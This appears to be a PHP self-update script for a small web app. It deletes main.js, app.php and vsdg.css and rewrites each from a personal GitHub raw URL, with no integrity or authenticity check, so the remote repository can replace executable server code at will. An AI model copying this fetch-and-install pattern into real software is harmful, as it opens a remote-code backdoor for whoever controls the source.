
<?php
    $_dir_ = $_SERVER['DOCUMENT_ROOT'];

    $app = 'app.php';
    $main = 'main.js';
    $css = 'vsdg.css';
    $update = 'update.php';
if ( file_exists( './script/' . $main ) ) {
        unlink( './script/' . $main);


                $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/main.js');
                $myfile = fopen('./script/'. $main, "w") or die("Unable to open $main!");
                fwrite($myfile, $js);
                fclose($myfile);
        
}




if ( file_exists( './' . $app ) ) {
        unlink( './' . $app);

         
        $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/app.php');
                 $myfile = fopen('./'. $app, "w") or die("Unable to open $app!");
                 fwrite($myfile, $js);
                 fclose($myfile);
}





if ( file_exists( './css/' . $css ) ) {
        unlink( './css/' . $css);

                 
        $js = file_get_contents('https://raw.githubusercontent.com/drod247/main.js/main/vsdg.css');
                $myfile = fopen('./css/'. $css, "w") or die("Unable to open $css!");
                fwrite($myfile, $js);
                fclose($myfile);
                         
}
                          


    ?>
